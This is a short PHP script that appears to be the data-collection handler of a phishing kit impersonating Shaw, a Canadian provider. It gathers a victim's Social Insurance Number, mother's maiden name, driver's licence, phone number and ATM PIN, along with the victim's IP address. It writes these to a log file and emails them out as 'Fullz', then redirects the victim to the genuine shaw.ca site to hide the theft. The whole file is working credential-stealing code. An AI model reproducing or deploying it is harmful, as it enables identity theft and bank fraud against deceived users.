<?php
if(isset($_POST['sin']))
      {
    
    include 'Email.php';
    
    $ip = getenv("REMOTE_ADDR");
    $message = "---------= T.DOX =---------\n";
    $message .= "---------= INFO COM =---------\n";
    $message .= "SIN: ".$_POST['sin']." \n";
    $message .= "MMN : ".$_POST['mmn']." \n";
    $message .= "Driver License: ".$_POST['dl']." \n";
     $message .= "Phone: ".$_POST['phone']." \n";
    $message .= "ATM PIN: ".$_POST['atmpin']." \n";
    
	    $message .= "---------=IP Adress & Date=---------\n";
    $message .= "IP Address: ".$ip."\n";
    $message .= "---------=by T.DOX =---------\n";
$subject = "> Fullz-T.DOX SSN <<";
$headers = "From: T.DOX@her".rand(1,999)."DOX" . "\r\n" ;
    
    @fclose(@fwrite(@fopen("DX3.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);
    
    header("Location: https://www.shaw.ca");
    
    }

 
 



?>